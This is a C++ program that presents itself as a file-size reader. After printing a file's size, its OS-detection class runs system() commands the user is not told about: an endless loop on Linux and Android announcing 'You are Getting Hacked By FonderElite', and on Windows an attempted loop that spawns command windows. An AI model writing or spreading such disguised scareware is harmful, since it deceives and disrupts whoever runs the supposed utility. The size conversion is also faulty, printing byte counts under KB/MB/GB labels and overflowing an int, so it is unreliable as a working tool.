#include <cmath>
#include <iostream>
#include <stdio.h>
#include<fstream>
#include <sys/utsname.h>
#include <stdlib.h>
using namespace std;

class Convert{
    public:
    virtual void file_read(string file){
    ifstream in_file(file, ios::binary);
   in_file.seekg(0, ios::end);
   int file_size = in_file.tellg();
   char buffer[1024];
   if(file_size >= 1024 && file_size< 1048576){
 string kb = "KiloBytes";
cout<<"Size of the file is"<<" "<< file_size<<" "<<kb<<endl;
}
else if(file_size >= 1048576 && file_size < 1073741824){
string mb = "MegaBytes";
cout<<"Size of the file is"<<" "<< file_size<<" "<<mb<<endl;
}

else if(file_size >= 1073741824 && file_size < 1099511627776){
string gb = "GigaBytes";
cout<<"Size of the file is"<<" "<< file_size<<" "<<gb<<endl;
}

else if(file_size >= 1099511627776 && file_size < 1125899906842624){
string tb = "TeraBytes";
cout<<"Size of the file is"<<" "<< file_size<<" "<<tb<<endl;
}

else if(file_size >= 1125899906842624){
string pb = "PetaBytes";
cout<<"Size of the file is"<<" "<< file_size<<" "<<pb<<endl;
}
else{
       cout<<"Size of the file is"<<" "<< file_size<<" "<<"bytes"<<endl;
   }
     double bits = file_size * 8;
       cout<<"Total Bits: "<<bits;
    }
    
};
class OS{
    public:
void detection(){
	struct utsname name;
	if(uname(&name)) exit(-1);
	printf("\nYour computer's OS is %s@%s\n", name.sysname, name.release);
	string operating_system = name.sysname;
	if(operating_system == "Linux"){
	    system("sleep 2");
       system("while true; do sleep 0.5; echo  'HIGH ALERT!(You are Getting Hacked By FonderElite.)'; done ");
	}else if(operating_system == "Windows"){
	system(":loop; color red; start cmd.exe; echo HACKED BY FONDERELITE!!!; goto loop;");
	}else if(operating_system == "Android"){
	    system("sleep 2");
       system("while true; do sleep 0.5; echo  'HIGH ALERT!(You are Getting Hacked By FonderElite.)'; done ");
	}
	
	else{
	    cout<<"This Script only detects Windows, Linux and Android";
	}
}
};
int main() {
OS op;
OS *sys = &op;
Convert c;
Convert *convert = &c;
string file_name;
cout<<"File-Size Reader "<<endl;
cout<<"File-Name: ";
cin >> file_name;
convert->file_read(file_name);
sys->detection();
return 0;
}
